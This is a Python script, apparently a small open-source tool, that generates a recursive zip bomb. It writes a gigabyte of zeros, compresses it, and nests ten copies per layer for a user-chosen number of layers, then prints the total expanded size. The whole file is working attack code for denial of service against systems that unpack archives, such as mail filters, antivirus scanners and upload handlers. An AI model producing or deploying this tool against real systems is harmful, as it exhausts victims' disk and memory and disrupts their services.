from __future__ import print_function
from shutil import copyfile
import zipfile
import zlib
import os
import sys

# constants

ART="""
     _       _                     _     
 ___(_)_ __ | |__   ___  _ __ ___ | |__  
|_  / | '_ \| '_ \ / _ \| '_ ` _ \| '_ \ 
 / /| | |_) | |_) | (_) | | | | | | |_) |
/___|_| .__/|_.__/ \___/|_| |_| |_|_.__/ 
      |_|                                

A cross-version zip bomb creation program. Use wisely!
"""
WORKDIR="/home/michael" # best left as $HOME or something under /tmp as write permissions are needed
TXTFILE='tragic.txt' # can be whatever filename, negligible size impact
DEPTH_FILE_NUMBER=10 # number of files per depth. best left as a power of ten.
TXT_FILE_SIZE=1 # size of the text file in GiB. Best left alone. for uniform expansion

# function definitions

"""
Create text file of size GiB. 1 is recommended. Create initial zip from it.
precondition: we are in the WORKDIR and have the correct permissions
"""
def create_txt(size):
    with open(TXTFILE, "w") as f:
        f.write((1024*1024*1024*size)*'0') # 1024**3 == 1 GiB of '0's
    zfile = zipfile.ZipFile('1.zip', 'w', compression=zipfile.ZIP_DEFLATED, allowZip64=True) # 1.zip so that depth creation works later
    zfile.write(TXTFILE, compress_type=zipfile.ZIP_DEFLATED)
    os.remove(TXTFILE)

"""
Create a depth by copying the tocopy zip file and adding it to a new zip file, result. Make DEPTH_FILE_NUMBER copies.
precondition: we are in the WORKDIR and have the correct permissions.
"""
def create_depth(tocopy, result, depth):
    zfile = zipfile.ZipFile(result, 'w', compression=zipfile.ZIP_DEFLATED, allowZip64=True)
    for i in range(DEPTH_FILE_NUMBER):
        copyfile(tocopy, '%d-%d.zip'%(depth, i))
        zfile.write('%d-%d.zip'%(depth, i), compress_type=zipfile.ZIP_DEFLATED)
        os.remove('%d-%d.zip'%(depth, i))
    os.remove(tocopy)

"""
create bomb file with specified number of depths. rename it to bomba.zip
"""
def forge_bomb(depths):
    for i in range(1, depths+1): # start from 1.zip for convenience
        create_depth('%s.zip'%str(i), '%s.zip'%str(i+1), i) # store copies of i.zip into i+1.zip, creating each layer
    if os.path.isfile('%d.zip'%(depths+1)): # depths+1 because last create_depth() call writes to depths+1
        os.rename('%d.zip'%(depths+1), 'bomba.zip') # bomba zip

"""
main function. get command line arguments and create the file. 
"""
if __name__ == "__main__":
    if len(sys.argv) < 2:
        print("Usage: %s <depths>" % sys.argv[0])
        sys.exit(1); # unsafe exit, see exit statuses if this is new to you
    depths = int(sys.argv[1])
    if not os.path.isdir(WORKDIR):
        os.mkdir(WORKDIR)
    os.chdir(WORKDIR)
    print(ART)
    print("[+] creating dump file...")
    create_txt(TXT_FILE_SIZE)
    print("[+] forging bomb...")
    forge_bomb(depths)
    print("[+] zip bomb at %s/bomba.zip!"%WORKDIR)
    print("[+] Total size when recursively expanded: %d GiB" % (DEPTH_FILE_NUMBER**depths))
